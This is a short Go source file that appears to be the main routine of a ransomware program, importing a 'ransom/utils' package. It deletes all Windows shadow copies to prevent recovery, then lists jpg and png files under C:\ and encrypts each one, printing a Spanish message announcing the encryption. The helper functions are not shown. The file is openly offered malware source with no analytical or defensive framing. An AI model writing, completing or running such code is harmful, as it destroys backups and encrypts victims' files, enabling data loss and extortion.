package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"ransom/utils"
)

func main() {
	errShadowCopies := DeleteAllShadowCopies()
	if errShadowCopies != nil {
		fmt.Println("Error:", errShadowCopies)
	return
	}
	files := ListFiles(`C:\`, []string{"jpg", "png"}) 

	fmt.Println("Cifrando los siguientes archivos:")
	for _,file := range files {
		EncryptFile(file)
		fmt.Println(file)
	}
}
